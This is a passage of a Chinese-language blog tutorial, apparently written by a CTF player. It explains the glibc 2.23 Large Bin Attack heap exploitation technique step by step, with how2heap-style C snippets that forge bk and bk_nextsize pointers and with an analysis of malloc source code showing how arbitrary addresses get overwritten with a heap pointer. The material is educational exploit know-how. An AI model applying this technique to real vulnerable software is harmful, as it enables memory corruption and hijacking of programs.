<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/4.png" alt="image-20250426195752913"></p>
<p><u>第三步：申请一个合适大小的堆块，触发 unsorted bin 遍历 。</u></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="unsorted-bin-相关机制："><a href="#unsorted-bin-相关机制：" class="headerlink" title="unsorted bin 相关机制："></a>unsorted bin 相关机制：</h4><p>我们要使 unsorted bin 进入 large bin ， 就要先知道unsorted bin的相关机制，通常我们释放一个堆块，glibc会尝试与前后堆块发生合并，合并后若非topchunk，且大小超过 unsorted bin 的设定阈值 , 它不会立即进入small bin &#x2F; large bin 中 ，而是进入 unsorted bin 中缓存起来，同时unsorted bin采用**<u>先进先出</u>**的插入取出方式。</p>
<p>在调用下一次 malloc(req_size) 时，首先会检查 fastbin 、small bin 然后才到 unsorted bin ，此时会依次取出 unsorted bin 表尾部的chunk(victim)，如果 chunksize(victim) 恰好等于 req_size , 就会直接返回；否则就会根据大小阈值（64-bit系统 &lt;&#x3D; 1024字节进入small bin ，&gt;1024字节进入large bin）插入相对应的 bin 中，再继续尝试下一个 unsorted 条目 。</p>
<p>如果 unsorted bin 遍历结束还没有找到相应大小的堆块 ，就会依次搜索 small bins 、 large bins ，若仍无合适的堆块，则调用sysmalloc，向系统申请新的堆块空间。</p>
<hr>
<p>根据 unsorted bin 相关机制 ，由于我们申请的0x90大小的堆块会优先检查fastbin和small bin，发现两个bins中都没有堆块，于是就进入 unsorted bin 中触发了 unsorted bin 遍历 ，由于unsorted bin 先进先出的规则 ，P1 会先被我们拿出来检查 ，发现大小不等于我们需要申请的0x90的堆块 ，于是根据大小阈值(0x400)，被划入了 large bin 当中，然后接着取出 P2 ，发现同样不满足对应大小 ，于是同样进入了  large bin 当中，unsorted bin 遍历结束 ，发现没有合适的 bin ，就会依次搜索 small bins ，large bins ，同时在搜索large bins的时候，采取 Best-fit 策略，也就是当申请的堆块 &lt;&#x3D;large bin(min_chunk)最小堆块的时候，就会优先从最小堆块进行分配 。</p>
<p>很显然由于 P1 &#x3D; 0x430 , P2 &#x3D; 0x510 ，所以P1会被拿出来分配堆块，然后分配完堆块的P1就会又被重新放回unsorted bin中。</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/5.png" alt="image-20250426203532614"></p>
<p>现在的局面变成了 P1 进入了unsorted bin, P2 进入了 large bin ，P3为 Allocated chunk 。</p>
<p><u>第四步：释放P3，三BIN鼎立</u></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p3);</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/6.png" alt="image-20250426204107261"></p>
<p><u>第五步：构造Large Bin Attack</u></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/7.png" alt="image-20250426212145734"></p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/8.png" alt="image-20250426211737512"></p>
<p>假设有漏洞可以纂改覆写 P2 的 size 、bk 以及 bk_nextsize ，这里是将 P2 的 size 变成了 0x3f1 ，fd 变成了 0 ，bk 变成了 stack_var1 -0x10 , fd_nextsize 变成了 0  ，bk_nextsize 变成了 stack_var2 - 0x20 。</p>
<p>此时的结构如下图所示：</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/9.png" alt="image-20250426211703179"></p>
<p>由于 bk 和 bk_nextsize 的纂改 ，构造了两个目标地址附近的fake_chunk 。</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/10.png" alt="image-20250426213622567"></p>
<p>但是此时的目标地址的值还没有被修改成堆地址，还需要进行最后一步操作。</p>
<p><u>第六步：将P3放入 large bin 内，触发 large bin attck 。</u></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure>

<p>这一步同上一步一样重要 ，前面提到过 ，Large Bin Attack 无非就是利用大堆块排序机制，这里我们需要把P3放入large bin后，才能触发 Large Bin Attack。</p>
<p>所以我们需要malloc(0x90)再次触发unsorted bin遍历，首先按照程序肯定是先检查fast bin、small bin，这里面没有，于是就接着检查unsorted bin(此时只有P1和P3在unsorted bin中)，根据先进先出原则，把 P1 给取出来，判断不满足合适大小，直接依照大小阈值，放入small bin中，然后把 P3 拿出来，判断不满足合适大小，放入 large bin 中，遍历结束，没有发现合适堆块，于是依次检查small bin，和 large bin ， 由于 small bin 中只有P1 ，于是 P1 又被拿出来分配堆块，而后重新丢入了 unsorted bin 中(P1好可怜🥹)，而 P3 留在了 large bin 内。</p>
<p>P3 进入了 large bin 导致触发了 Large Bin Attack ，为什么会触发这个呢？让我们来根据GLIBC-2.23的源码进行分析。</p>
<p><strong>关于进入large bin的大堆块排序相关源码在下：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>内容稍微有一点多 ，我们把源码拆解分析 ：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>首先是这个while循环部分，这里对进入large bin的堆块size进行了一个判断，如果进入large bin的size小于前一个堆块的size，就会执行while循环里面的内容（其实里面就是一个简单的循环排序法，会根据判断，把进入large bin的堆块随着循环不断置前，直到不小于前面一个堆块的size为止——Large Bin由大到小排序），但是由于我们纂改了 P2 的size为 0x3f1 , 并且 P3 &#x3D; 0X510 ，所以P3大于P2 , 不满足while循环的条件,于是我们跳过while循环，来到了下面一个部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">    fwd = fwd-&gt;fd; </span><br></pre></td></tr></table></figure>

<p>这一部分是判断进入Large Bin堆块的size 与前面一个空闲堆块的size是否相等，如果相等的话就会执行if语句里面的内容，但是很显然，进入large bin的 P3 明显不等于 P2，所以跳过了 if 语句里面的内容，进入下一个部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> </span><br><span class="line">     &#123;</span><br><span class="line">         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">     &#125;</span><br><span class="line">     bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure>

<p>这一部分是我们必须要执行的部分了，很明显是对victim(P3)结构的一些赋值操作，这段源码造成了以下影响：</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/11.png" alt="image-20250426225014983">（红色部分是前三条源码改变的部分)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br></pre></td></tr></table></figure>

<p>将 P3 的 fd_nexsize 变成了 P2 的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure>

<p>将 P3 的 bk_nextsize 变成了 P2 的 bk_nextsize 也就是 stack_var2 - 0x20</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>将 P2 的 bk_nextsize 变成了 P3 的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>**关键的一步：**将 P3 的 bk_nextsize 也就是 stack_var2 - 0x20 的 fake_chunk 的 fd_nextsize(stack_var2)变成了 P3 的地址 ！</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/12.png" alt="image-20250426225937386"></p>
<p>细心的你现在可以发现，Large Bin Attack 已经实现了 ，我们把 stack_var2 目标地址写入了我们P3堆块的地址 。</p>
<p>但是 Large Bin Attack 还没有结束 ，我们接着往下面看。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/13.png" alt="image-20250426231400362"></p>
<p>上面是在执行代码之前的结构（图一）</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/14.png" alt="image-20250426232438420"></p>
<p>上面是在执行代码之后的结构（图二）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br></pre></td></tr></table></figure>

<p>首先我们要知道 P3 在进入large bin是插入到 P2 之后的（看图一想象插入 P3 ）</p>
<p>代码将 P3 的 bk 变成了进入large bin时相同大小的后面一个堆块也就是 stack_var1 - 0x10 （这里虽然之前 P2 纂改了大小，但是它的判定还是在 0x510这个范围，所以可以看作是和 P3 在同一个 Bin 里面）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd = fwd;</span><br></pre></td></tr></table></figure>

<p>P3 的 fd 变成了 P3 的前面一个堆块也就是 P2 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk = victim;</span><br></pre></td></tr></table></figure>

<p>将 P2 的 bk 变成了 P3</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>将 stack_var1 - 0x10 的 fd 也就是 stack_var1 变成了 P3 !</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/15.png" alt="image-20250426233127191"></p>
<p><strong><u>Large Bin Attack 成功实现！</u></strong></p>
<p>成功纂改了任意地址的值为堆块的地址。</p>
<p>后续还会更新关于 Largin Bin Attack 相关题型的讲解，在这篇文章 。。。。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://spacedragon-ux.github.io">SpaceDraG0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://spacedragon-ux.github.io/2025/04/24/Large-Bin-Attack/">https://spacedragon-ux.github.io/2025/04/24/Large-Bin-Attack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://spacedragon-ux.github.io" target="_blank">SpaceDraG0n</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Large-Bin-Attack/">Large Bin Attack</a></div><div class="post-share"><div class="social-share" data-image="/img/A5.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/" title="UCSC CTF 2025 WP"><img class="cover" src="/img/loading.gif" data-original="/img/UCSC2025.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">UCSC CTF 2025 WP</div></div><div class="info-2"><div class="info-item-1">UCSC CTF 2025 WP —- PWNBoFido 常规检查： 64位程序 NX保护 IDA: main（）函数：  主函数的代码逻辑非常的简单 循环十次 每次循环创造三个随机数 让玩家进行猜数游戏 程序中还存在明显的system(“&#x2F;bin&#x2F;sh”)后门函数调用  要想进入这个后门函数 我们就必须要满足 v14 &#x3D;&#x3D; 10 这一个条件 而 v14 这个变量在程序中的作用是统计全猜中的次数 每个回合三个数字全部猜中 v14 的值就会加一 但由于进行猜数的回合只有十次 所以我们若想要进行后门函数调用 最直接的方法就必须要每一个回合都把三个数给猜对  但是如果是一直乱猜 明显是不太现实（比彩票中大奖的概率还低）所以这就需要我们来控制赌局的中奖率 从而达到把把全猜中的目的 那么我们该如何利用漏洞进行实现呢？  我们想要控制中奖率 就必须要知道 随机数是如何进行生成的：   C 语言提供了 rand() 函数来生成随机数，该函数通常基于线性同余法等算法实现。每次调用 rand()...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/%E5%A4%B4%E5%83%8F3.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">SpaceDraG0n</div><div class="author-info-description">认真做事 坚持学习</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/spacedragon-ux"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/SpaceDragon-ux" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=3517259913&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3517259913@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Large-Bin"><span class="toc-number">1.</span> <span class="toc-text">Large Bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">基本概念 :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Large-Bin-%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">Large Bin 的结构 :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E8%A1%A8%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">链表结构：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85-%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">补充 ：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E9%A1%BA%E5%BA%8F%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">插入顺序：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Large-Bin-Attack"><span class="toc-number">2.</span> <span class="toc-text">Large Bin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GLIBC-2-23-%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">GLIBC-2.23 攻击手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#how2heap%E6%BA%90%E7%A0%81%E5%B1%95%E7%A4%BA%EF%BC%9A"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">how2heap源码展示：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Large-Bin-Attack-%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">Large Bin Attack 的利用思路以及其作用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Large-Bin-Attack-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">Large Bin Attack 源码调试：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin-%E7%9B%B8%E5%85%B3%E6%9C%BA%E5%88%B6%EF%BC%9A"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">unsorted bin 相关机制：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/24/Large-Bin-Attack/" title="Large Bin Attack"><img src="/img/loading.gif" data-original="/img/A5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Large Bin Attack"/></a><div class="content"><a class="title" href="/2025/04/24/Large-Bin-Attack/" title="Large Bin Attack">Large Bin Attack</a><time datetime="2025-04-24T15:49:30.584Z" title="发表于 2025-04-24 23:49:30">2025-04-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/" title="UCSC CTF 2025 WP"><img src="/img/loading.gif" data-original="/img/UCSC2025.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UCSC CTF 2025 WP"/></a><div class="content"><a class="title" href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/" title="UCSC CTF 2025 WP">UCSC CTF 2025 WP</a><time datetime="2025-04-21T23:53:50.412Z" title="发表于 2025-04-22 07:53:50">2025-04-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 By SpaceDraG0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>